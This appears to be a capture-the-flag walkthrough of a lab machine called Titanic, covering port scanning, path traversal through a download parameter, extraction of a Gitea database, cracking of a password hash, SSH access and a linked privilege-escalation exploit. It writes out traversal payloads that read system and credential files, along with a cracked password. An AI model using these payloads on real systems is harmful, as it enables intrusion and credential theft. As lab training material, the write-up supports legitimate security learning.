# 🚢 Titanic

## 📝 Overview

The box involves **path traversal**, **SQLite database extraction**, **hash cracking**, and a **privilege escalation via CVE-2024-41817**.

## 🔍 Enumeration

Nmap:
```sh
nmap -T3 10.10.11.55
nmap -Pn -T3 10.10.11.55
nmap -Pn -sS -p- -T4 10.10.11.55
nmap -sC -sV -p 22,80 10.10.11.55
```
Add the host to /etc/hosts:
```sh
echo "10.10.11.55 titanic.htb" | sudo tee -a /etc/hosts
```
Directory Bruteforce:
```sh
gobuster dir -u http://titanic.htb -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

## 🕵️ Discovery
Path Traversal, tested LFI via the ticket parameter:
```sh
http://titanic.htb/download?ticket=../../../../etc/passwd
http://titanic.htb/download?ticket=../../../../home/developer/gitea/data/gitea/conf/app.ini
```
Found a new vhost: dev.titanic.htb:
```sh
http://titanic.htb/download?ticket=../../../../etc/hosts => dev.titanic.htb
```
Extracted the Gitea SQLite database:
```sh
http://titanic.htb/download?ticket=../../../../home/developer/gitea/data/gitea/gitea.db
```

Meanwhile, on the dev.titanic.htb virtual host, we find a Gitea instance hosting two repositories: docker-config and flask-app

## 💾 Database Analysis
Open the database:
```sh
sqlite3 gitea.db:
.tables
SELECT id, name, lower_name, email, passwd FROM user;
SELECT name, passwd, salt FROM user;
```
Convert salts & hashes for base64:
```sh
echo -n "HASH/SALT" | xxd -r -p | base64
```
Crack using hashcat:
```sh
hashcat -m 10900 hashes.txt /usr/share/wordlists/rockyou.txt --user
```
Found credentials:
```
developer : 25282528
```

<!--
john --list=formats | tr ',' '\n' | grep PBKDF2 | grep SHA256
john --list=format-details --format=PBKDF2-HMAC-SHA256
-->

## 🔑 Access via SSH
```sh
ssh developer@titanic.htb
```

## ⚡ Privilege Escalation
While enumerating the system, found a vulnerable component exploitable via CVE-2024-41817:  
[CVE-2024-41817 PoC](https://github.com/Dxsk/CVE-2024-41817-poc)